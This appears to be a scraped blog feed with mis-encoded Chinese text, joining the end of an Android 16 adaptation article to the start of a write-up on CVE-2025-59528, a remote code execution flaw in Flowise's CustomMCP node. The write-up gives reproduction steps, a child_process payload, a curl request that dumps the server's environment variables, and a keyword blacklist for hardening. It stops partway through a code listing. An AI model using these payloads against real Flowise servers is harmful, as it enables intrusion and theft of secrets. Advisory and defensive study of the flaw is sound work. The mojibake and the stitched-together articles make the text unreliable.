<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b0c6ad2a0a54aa997a60a729f6316ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29mZmVlZWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769046909&amp;x-signature=IEyISCXxB%2FpycvDdzFlZ2zm3MdI%3D" alt="image.png" width="50%" loading="lazy"/>
<p>æœç„¶é¡µé¢ä¸å†è¢«ç³»ç»Ÿæ æŒ¡ä½äº†ï¼ŒçŠ¶æ€æ å¯¼èˆªæ ä¹Ÿéƒ½ä¸æ˜¯é€æ˜çš„äº†ï¼Œå±…ç„¶æœ‰è¿™ä¹ˆå¥½çš„ä¸œè¥¿ï¼å¯æƒœçŸ¥é“çš„å¤ªæ™šï¼Œæˆ‘å·²ç»é€‚é…å®Œäº†ï¼Œä½†æ˜¯è¿™ä¹ˆå¥½çš„ä¸œè¥¿ï¼Œåˆ°äº†Android16å°±è¦è¢«åºŸå¼ƒäº†ï¼Œæˆ‘ä»¬å°†targetæŒ‡å‘36çœ‹çœ‹</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e194db65ecb4e1da6a598fde393d49e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29mZmVlZWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769046909&amp;x-signature=uRvakNDrWTFeLRTW9sa4zJz8%2Fp8%3D" alt="image.png" width="70%" loading="lazy"/>
<p>çœ‹åˆ°æ²¡ï¼Œåˆæ‰“å›åŸæ ·äº†ï¼Œä¸è¿‡è¿™ä¸ªä¹Ÿæ˜¯å› ä¸ºæˆ‘è·‘çš„æ¨¡æ‹Ÿå™¨å¹³å°ä¹Ÿæ˜¯16çš„ï¼Œå¦‚æœæ¢æˆ15çš„è®¾å¤‡ï¼Œ<code>windowOptOutEdgeToEdgeEnforcement</code>è¿™ä¸ªå¼€å…³ä¾ç„¶èƒ½ç”¨ï¼Œæ‰€ä»¥è¿˜æ˜¯ä¸è¦å·æ‡’äº†ï¼Œéƒ½å»é€‚é…å§</p>
<h2 data-id="heading-11">é¢„æµ‹æ€§è¿”å›è¿ç§»æˆ–è€…æš‚æ—¶åœç”¨</h2>
<p>é¢„æµ‹æ€§è¿”å›è¿™ä¸ªç‰¹æ€§æ˜¯Android15å‡ºæ¥ç‰¹æ€§ï¼Œä½†æ˜¯é‚£ä¼šè¿˜å¤„äºé»˜è®¤åœç”¨çŠ¶æ€ï¼Œä½†æ˜¯åˆ°äº†Android16,è¿™ä¸ªé¢„æµ‹æ€§è¿”å›å°†ä¼šè¢«é»˜è®¤å¼€å¯ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€ä½ é¡¹ç›®é‡Œé¢ç±»ä¼¼äº<code>onBackPressed</code>æ–¹æ³•ï¼Œä»¥åŠ<code>KeyEvent.KeyCODE_BACK</code>å°†ä¼šå˜å¾—æ— æ•ˆï¼Œå¯ä»¥è¯•ä¸€ä¸‹åœ¨targetæŒ‡å‘36çš„é¡¹ç›®ä¸­é‡å†™ä¸€ä¸‹<code>onBackPressed</code>ï¼Œå°±ä¼šå‘ç°è¯¥æ–¹æ³•ä¸Šä¼šæœ‰æ ¹çº¢çº¿</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30ab932c63474678b0f3b08f51af74c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29mZmVlZWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769046909&amp;x-signature=Vmr9Wl96mNdzd02tGHoz%2BhCaoAQ%3D" alt="image.png" width="80%" loading="lazy"/>
<p>è¿™é‡Œçš„çº¢çº¿å¹¶ä¸ä¼šå½±å“ç¼–è¯‘ï¼Œä½†æ˜¯è·‘èµ·æ¥åå‘ç°ç‚¹å‡»backæŒ‰é’®ï¼Œæˆ‘ä»¬çš„toastå°±å‡ºä¸æ¥äº†ï¼Œæ˜æ˜¾æ²¡æœ‰èµ°åˆ°<code>onBackPressed</code>æ–¹æ³•é‡Œå»</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d16b0092233643b1b26542a3b753041a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29mZmVlZWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769046909&amp;x-signature=7ZpEYkdyJ0UM3scdYyEn1k6EpnE%3D" alt="002.gif" width="60%" loading="lazy"/>
<p>å¦‚æœæƒ³è¦ç»§ç»­åœ¨<code>onBackPressed</code>æ–¹æ³•ä¸­å›è°ƒï¼Œé‚£ä¹ˆå°±è¦å…³é—­é¢„æµ‹æ€§è¿”å›ï¼Œæ–¹æ³•å°±æ˜¯åœ¨<code>AndroidManifest.xml</code>æ–‡ä»¶ä¸­çš„æˆ–è€…èŠ‚ç‚¹ä¸‹æ·»åŠ å¦‚ä¸‹å±æ€§</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d3a24837d014e76a43d7588282c250f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29mZmVlZWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769046909&amp;x-signature=C2PT93y8VAzUrIYFTMYCSNvacI0%3D" alt="image.png" width="70%" loading="lazy"/>
<p>å½“åŠ ä¸Šè¿™ä¸ªå¼€å…³åï¼Œä¼šå‘ç°<code>onBackPressed</code>æ–¹æ³•ä¸Šçš„çº¢çº¿ä¹Ÿæ¶ˆå¤±äº†ï¼Œè¿è¡Œåä¼šç‚¹å‡»backæŒ‰é’®,ç•Œé¢ä¸Šä¹Ÿå¼¹å‡ºæ¥äº†toast</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a062e4887e084c0891f3547935303bc1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29mZmVlZWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769046909&amp;x-signature=g1F9u4U%2BkeHqdOuLbOlfKYg9KrE%3D" alt="003-ezgif.com-video-to-gif-converter.gif" width="60%" loading="lazy"/>
<p>æœ‰äº†è¿™ä¸ªå¼€å…³ï¼Œè‡³å°‘èƒ½å¤Ÿä¿è¯ä½ å¯ä»¥å…ˆå°†ä½ çš„appçš„ç›®æ ‡å¹³å°å‡è‡³36ï¼Œç­‰åˆ°é¢„æµ‹æ€§è¿”å›é€‚é…å®Œæˆåï¼Œå†å°†å¼€å…³å–æ¶ˆæ‰ï¼Œæ—¢ä¸ä¼šå½±å“ä¸Šçº¿æ—¶é—´ï¼Œä¹Ÿä¸ä¼šé‡åˆ°é¢„æµ‹æ€§è¿”å›å¸¦æ¥çš„ä¸€äº›åŠŸèƒ½å¤±æ•ˆ</p>
<h2 data-id="heading-12">æœ€å</h2>
<p>æ€»çš„æ¥è¯´ï¼ŒAndroid16æœ‰ä¸å°‘å±æ€§æˆ–è€…apiè¢«åºŸå¼ƒäº†ï¼Œå¦‚æœä½ çš„åº”ç”¨ä¹‹å‰æœ‰ç”¨åˆ°ï¼Œé‚£ä¹ˆè¿™é‡Œå°±éœ€è¦åšä¸€äº›è°ƒæ•´ï¼Œè¿˜æœ‰å°±æ˜¯é¢„æµ‹æ€§è¿”å›ï¼Œè¿™æ¬¡è¢«é»˜è®¤å¼€å¯äº†ï¼Œè™½ç„¶æœ‰ä¸ªå¼€å…³å¯ä»¥æš‚æ—¶æŠŠå®ƒå…³æ‰ï¼Œä½†ä¼°è®¡è¿™ä¸ªå¼€å…³è¢«åºŸå¼ƒä¹Ÿæ˜¯è¿Ÿæ—©çš„äº‹æƒ…ï¼Œæ‰€ä»¥æ²¡æœ‰é€‚é…é¢„æµ‹æ€§è¿”å›çš„è€å“¥ä»¬ï¼Œä¹Ÿå¾—æŠ“ç´§å¼€å§‹æèµ·äº†</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥è§£æCVE-2025-59528ï¼šFlowiseä¸­çš„é«˜å±è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´]]></title>    <link>https://juejin.cn/post/7595033052796305449</link>    <guid>https://juejin.cn/post/7595033052796305449</guid>    <pubDate>2026-01-14T15:49:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595033052796305449" data-draft-id="7595033052796289065" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥è§£æCVE-2025-59528ï¼šFlowiseä¸­çš„é«˜å±è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIGC"/> <meta itemprop="datePublished" content="2026-01-14T15:49:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥è§£æCVE-2025-59528ï¼šFlowiseä¸­çš„é«˜å±è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T15:49:55.000Z" title="Wed Jan 14 2026 15:49:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸ“‹ é¡¹ç›®æ¦‚è¿°</h2>
<p><strong>CVE-2025-59528</strong> æ˜¯ä¸€ä¸ªåœ¨Flowiseé¡¹ç›®ä¸­å‘ç°çš„<strong>é«˜å±è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰<strong>å®‰å…¨æ¼æ´ã€‚è¯¥æ¼æ´å­˜åœ¨äºFlowiseçš„</strong>CustomMCP</strong>èŠ‚ç‚¹ä¸­ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ¶æ„è¯·æ±‚åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„JavaScript/Node.jsä»£ç ï¼Œæ— éœ€ä»»ä½•èº«ä»½éªŒè¯æˆ–ç”¨æˆ·äº¤äº’ã€‚ç”±äºå¯ä»¥é€šè¿‡ç½‘ç»œå®Œå…¨æ§åˆ¶ç³»ç»Ÿï¼Œè¯¥æ¼æ´è¢«è¯„ä¸º<strong>CVSS 10.0</strong>æœ€é«˜å±é™©ç­‰çº§ã€‚</p>
<p><strong>å—å½±å“ç‰ˆæœ¬ï¼š</strong> Flowise â‰¤ 3.0.5<br/>
<strong>å·²ä¿®å¤ç‰ˆæœ¬ï¼š</strong> 3.0.6+</p>
<h2 data-id="heading-1">ğŸš€ åŠŸèƒ½ç‰¹æ€§</h2>
<p>åŸºäºæä¾›çš„å®‰å…¨åˆ†ææ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥æç‚¼å‡ºè¯¥é¡¹ç›®çš„æ ¸å¿ƒåŠŸèƒ½ç‰¹æ€§ï¼š</p>
<ul>
<li><strong>è‡ªå®šä¹‰MCPæœåŠ¡å™¨é…ç½®</strong>ï¼šFlowiseå…è®¸ç”¨æˆ·ä¸ºè‡ªå®šä¹‰MCPæœåŠ¡å™¨æä¾›é…ç½®å­—ç¬¦ä¸²</li>
<li><strong>JavaScriptæ‰§è¡Œç¯å¢ƒ</strong>ï¼šæ”¯æŒåœ¨æœåŠ¡å™¨ç«¯æ‰§è¡ŒJavaScriptä»£ç é€»è¾‘</li>
<li><strong>Node.jsè¿è¡Œæ—¶é›†æˆ</strong>ï¼šæ·±åº¦é›†æˆNode.jsç¯å¢ƒï¼Œå¯è®¿é—®ç³»ç»Ÿèµ„æº</li>
<li><strong>è¿œç¨‹APIæ¥å£</strong>ï¼šæä¾›<code>/api/v1/node-load-method/customMCP</code>ç­‰APIç«¯ç‚¹å¤„ç†è¯·æ±‚</li>
<li><strong>æ¨¡å—åŒ–æ‰©å±•</strong>ï¼šé€šè¿‡CustomMCPèŠ‚ç‚¹å®ç°åŠŸèƒ½æ‰©å±•å’Œå®šåˆ¶</li>
</ul>
<h2 data-id="heading-2">ğŸ”§ æ¼æ´æŠ€æœ¯åˆ†æ</h2>
<h3 data-id="heading-3">æ ¹æœ¬åŸå› </h3>
<p>Flowiseåœ¨å¤„ç†ç”¨æˆ·æä¾›çš„MCPæœåŠ¡å™¨é…ç½®å­—ç¬¦ä¸²æ—¶ï¼Œé‡‡ç”¨ä¸å®‰å…¨çš„ä»£ç æ‰§è¡Œæ–¹å¼ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¸å®‰å…¨çš„ä»£ç æ‰§è¡Œé€»è¾‘</span>
<span class="hljs-title class_">Function</span>(<span class="hljs-string">"return "</span> + userInput)()
</code></pre>
<p>è¿™ç§å®ç°æ–¹å¼å°†ç”¨æˆ·è¾“å…¥ç›´æ¥è½¬æ¢ä¸ºå¯æ‰§è¡Œçš„JavaScriptä»£ç ï¼Œä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿè®¿é—®ï¼š</p>
<ol>
<li><strong>ç³»ç»Ÿçº§èµ„æº</strong>ï¼šåŒ…æ‹¬<code>child_process</code>ã€<code>fs</code>æ¨¡å—</li>
<li><strong>ç¯å¢ƒä¿¡æ¯</strong>ï¼šæœåŠ¡å™¨ç¯å¢ƒå˜é‡å’Œé…ç½®</li>
<li><strong>æ“ä½œç³»ç»Ÿå‘½ä»¤</strong>ï¼šé€šè¿‡Node.jsæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤</li>
<li><strong>å®Œæ•´è¿è¡Œæ—¶</strong>ï¼šæ•´ä¸ªNode.jsè¿è¡Œæ—¶ç¯å¢ƒ</li>
</ol>
<p>è¿™ç›¸å½“äºä¸ºæ”»å‡»è€…æä¾›äº†ä¸€ä¸ª<strong>æœåŠ¡å™¨ç«¯JavaScriptæ§åˆ¶å°</strong>ã€‚</p>
<h3 data-id="heading-4">æ”»å‡»å‘é‡</h3>
<p>æ”»å‡»è€…å¯ä»¥å‘ä»¥ä¸‹ç«¯ç‚¹å‘é€æ¶æ„POSTè¯·æ±‚ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">/api/v1/node-load-method/customMCP
</code></pre>
<p>è½½è·ä¸­åŒ…å«çš„æ¶æ„ä»£ç ä¼šè¢«ç›´æ¥æ‰§è¡Œï¼Œå¯¼è‡´ï¼š</p>
<ul>
<li><strong>å‘½ä»¤æ‰§è¡Œ</strong>ï¼šè¿è¡Œä»»æ„shellå‘½ä»¤</li>
<li><strong>æ¶æ„è½¯ä»¶éƒ¨ç½²</strong>ï¼šå®‰è£…åé—¨æˆ–æ¶æ„è½¯ä»¶</li>
<li><strong>æ–‡ä»¶ç³»ç»Ÿæ“ä½œ</strong>ï¼šè¯»å–ã€å†™å…¥ã€åˆ é™¤ä»»æ„æ–‡ä»¶</li>
<li><strong>æ¨ªå‘ç§»åŠ¨</strong>ï¼šæ¸—é€ç›¸é‚»ç³»ç»Ÿå’ŒæœåŠ¡</li>
</ul>
<h2 data-id="heading-5">ğŸ“¦ å®‰è£…ä¸éƒ¨ç½²</h2>
<h3 data-id="heading-6">ç³»ç»Ÿè¦æ±‚</h3>
<ul>
<li><strong>Node.jsç¯å¢ƒ</strong>ï¼šæ”¯æŒJavaScriptä»£ç æ‰§è¡Œ</li>
<li><strong>Flowiseæ¡†æ¶</strong>ï¼šç‰ˆæœ¬3.0.5åŠä»¥ä¸‹å­˜åœ¨æ¼æ´</li>
<li><strong>ç½‘ç»œè®¿é—®</strong>ï¼šæ”»å‡»éœ€è¦èƒ½å¤Ÿè®¿é—®FlowiseæœåŠ¡ç«¯ç‚¹</li>
</ul>
<h3 data-id="heading-7">æ¼æ´å¤ç°ç¯å¢ƒ</h3>
<p>å¦‚éœ€å¤ç°è¯¥æ¼æ´ï¼Œéœ€è¦é…ç½®ä»¥ä¸‹ç¯å¢ƒï¼š</p>
<ol>
<li>
<p><strong>å®‰è£…æ˜“å—æ”»å‡»ç‰ˆæœ¬</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®‰è£…å­˜åœ¨æ¼æ´çš„Flowiseç‰ˆæœ¬</span>
npm install flowise@3.0.5
</code></pre>
</li>
<li>
<p><strong>å¯åŠ¨æœåŠ¡</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¯åŠ¨FlowiseæœåŠ¡</span>
npx flowise start
</code></pre>
</li>
<li>
<p><strong>éªŒè¯æ¼æ´å­˜åœ¨</strong>ï¼š
æœåŠ¡å¯åŠ¨åï¼Œ<code>/api/v1/node-load-method/customMCP</code>ç«¯ç‚¹å°†æš´éœ²å­˜åœ¨RCEæ¼æ´ã€‚</p>
</li>
</ol>
<h3 data-id="heading-8">å®‰å…¨ä¿®å¤å®‰è£…</h3>
<p>ä¸ºç¡®ä¿ç³»ç»Ÿå®‰å…¨ï¼Œå¿…é¡»å‡çº§åˆ°ä¿®å¤ç‰ˆæœ¬ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å‡çº§åˆ°å®‰å…¨ç‰ˆæœ¬</span>
npm install flowise@3.0.6
</code></pre>
<h2 data-id="heading-9">ğŸ› ï¸ ä½¿ç”¨è¯´æ˜</h2>
<h3 data-id="heading-10">æ¼æ´éªŒè¯æ–¹æ³•</h3>
<p>ä»¥ä¸‹æ˜¯éªŒè¯è¯¥æ¼æ´å­˜åœ¨çš„åŸºæœ¬æ­¥éª¤ï¼š</p>
<h4 data-id="heading-11">1. æ„é€ æ¶æ„è¯·æ±‚</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç¤ºä¾‹æ¶æ„è½½è·</span>
<span class="hljs-keyword">const</span> maliciousPayload = {
  <span class="hljs-attr">mcpServerConfig</span>: <span class="hljs-string">"(() =&gt; { require('child_process').exec('whoami'); })()"</span>
};
</code></pre>
<h4 data-id="heading-12">2. å‘é€æ”»å‡»è¯·æ±‚</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨curlå‘é€æ¶æ„è¯·æ±‚</span>
curl -X POST http://target-flowise-server:3000/api/v1/node-load-method/customMCP \
  -H <span class="hljs-string">"Content-Type: application/json"</span> \
  -d <span class="hljs-string">'{"mcpServerConfig":"(() =&gt; { return process.env; })()"}'</span>
</code></pre>
<h4 data-id="heading-13">3. éªŒè¯æ‰§è¡Œç»“æœ</h4>
<p>å¦‚æœæœåŠ¡å™¨è¿”å›äº†ç¯å¢ƒå˜é‡ä¿¡æ¯ï¼Œè¯´æ˜æ¼æ´å­˜åœ¨ä¸”å¯åˆ©ç”¨ã€‚</p>
<h3 data-id="heading-14">å®‰å…¨é…ç½®å»ºè®®</h3>
<p>å¯¹äºæ— æ³•ç«‹å³å‡çº§çš„ç¯å¢ƒï¼Œå»ºè®®é‡‡å–ä»¥ä¸‹åŠ å›ºæªæ–½ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. å®æ–½è¾“å…¥éªŒè¯</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">validateMCPConfig</span>(<span class="hljs-params">input</span>) {
  <span class="hljs-keyword">const</span> blacklist = [<span class="hljs-string">'child_process'</span>, <span class="hljs-string">'fs'</span>, <span class="hljs-string">'eval'</span>, <span class="hljs-string">'Function'</span>, <span class="hljs-string">'require'</span>];
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> item <span class="hljs-keyword">of</span> blacklist) {
    <span class="hljs-keyword">if</span> (input.<span class="hljs-title function_">includes</span>(item)) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Invalid configuration: <span class="hljs-subst">${item}</span> not allowed`</span>);
    }
  }
  <span class="hljs-keyword">return</span> input;
}

<span class="hljs-comment">// 2. å®æ–½æ²™ç®±æ‰§è¡Œç¯å¢ƒ</span>
<span class="hljs-keyword">const</span> { <span class="hljs-variable constant_">VM</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vm2'</span>);
<span class="hljs-keyword">function</span> <span class="hljs-title function_">safeEval</span>(<span class="hljs-params">code</span>) {
  <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title function_">VM</span>({
    <span class="hljs-attr">timeout</span>: <span class="hljs-number">1000</span>,
    <span class="hljs-attr">sandbox</span>: {},
    <span class="hljs-attr">eval</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-attr">wasm</span>: <span class="hljs-literal">false</span>
  });
  <span class="hljs-keyword">return</span> vm.<span class="hljs-title function_">run</span>(code);
}
</code></pre>
<h2 data-id="heading-15">ğŸ’» æ ¸å¿ƒä»£ç åˆ†æ</h2>
<h3 data-id="heading-16">1. æ¼æ´è§¦å‘ç‚¹ä»£ç </h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// packages/server/src/index.ts</span>
<span class="hljs-comment">// CustomMCPèŠ‚ç‚¹å¤„ç†é€»è¾‘</span>

<span class="hljs-comment">/**
 * å¤„ç†CustomMCPèŠ‚ç‚¹é…ç½®
 * <span class="hljs-doctag">@param</span> config ç”¨æˆ·æä¾›çš„é…ç½®å­—ç¬¦ä¸²
 * <span class="hljs-doctag">@returns</span> æ‰§è¡Œç»“æœ
 */</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleCustomMCPConfig</span>(<span class="hljs-params">config: string</span>): <span class="hljs-title class_">Promise</span>&lt;any&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// ğŸš¨ æ¼æ´ä»£ç ï¼šç›´æ¥ä½¿ç”¨Functionæ„é€ å‡½æ•°æ‰§è¡Œç”¨æˆ·è¾“å…¥</span>
    <span class="hljs-keyword">const</span> parsedConfig = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>(<span class="hljs-string">'return '</span> + config)();
    
    <span class="hljs-comment">// ç»§ç»­å¤„ç†è§£æåçš„é…ç½®</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> <span class="hljs-title function_">processMCPConfig</span>(parsedConfig);
  } <span class="hljs-keyword">catch</span> (error) {
    logger.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Failed to parse MCP config'</span>, error);
    <span class="hljs-keyword">throw</span> error;
  }
}
</code></pre>
<p><strong>ä»£ç åˆ†æï¼š</strong></p>
<ul>
<li>ä½¿ç”¨<code>new Function()</code>æ„é€ å‡½æ•°åŠ¨æ€åˆ›å»ºå‡½æ•°</li>
<li>ç›´æ¥æ‹¼æ¥ç”¨æˆ·è¾“å…¥å­—ç¬¦ä¸²ï¼Œæœªè¿›è¡Œä»»ä½•è¿‡æ»¤æˆ–éªŒè¯</li>
<li>å…è®¸æ‰§è¡Œä»»æ„JavaScriptä»£ç </li>
</ul>
<h3 data-id="heading-17">2. APIç«¯ç‚¹å¤„ç†ä»£ç </h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// packages/server/src/routes/nodes.ts</span>
